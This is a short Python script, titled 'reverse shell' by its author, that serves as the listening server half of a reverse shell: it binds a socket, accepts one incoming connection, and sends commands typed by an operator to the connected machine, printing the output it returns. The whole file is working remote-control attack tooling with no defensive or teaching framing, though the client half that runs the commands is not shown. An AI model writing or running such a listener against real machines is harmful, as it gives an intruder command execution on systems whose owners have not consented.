'''
    reverse shell
    
    author @ Himanshu Bag :-)
'''


import socket
import sys

if(len(sys.argv[1:])!=1):
    print("[!] invalid input. Try again.")
    print("Usage:- python3 server.py <port_no>")
    sys.exit()

host,port = '127.0.0.1',int(sys.argv[1])
try:
    global s
    print('[*] Socket Initializing..... ',end='')
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    # To prevent,OSError: [Errno 98] Address already in use
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print('Success')

except socket.error as e:
    print('[!] Unable to initiate socket !!')
    print('[!] ERROR :',str(e))
    sys.exit()


def send_commands(con,ad):
    while True:
        cmd= input('~> ')
        if (cmd=='quit'):
            con.close()
            s.close()
            sys.exit()
        if(len(str.encode(cmd))>0):
            try:
                con.send(str.encode(cmd))
                result=str(con.recv(1024),"utf-8")
                print(result,end=" ")
            except Exception as e:
                print(e)

def bind_socket(host,port):
    try:
        print('[*] Binding Socket with Port {} ....'.format(port),end='')
        s.bind((host,port))
        s.listen(5)
        print('Success '+'\n')
        print('[*] Waiting for Connections......'+ '\n')
    except socket.error as m:
        print('[!] Error in Binding socket :: ',str(m))
        x=input('[?] Do you want to retry? (Y/n)')
        if(x=='Y' or x=='y'):
            bind_socket(host,port)



print('\n')
bind_socket(host,port)
 
con,ad = s.accept()
print('-'*80)
print('[*] Connected To IP : {0} | Port : {1}'.format(ad[0],ad[1])+'\n')
send_commands(con,ad)
con.close()







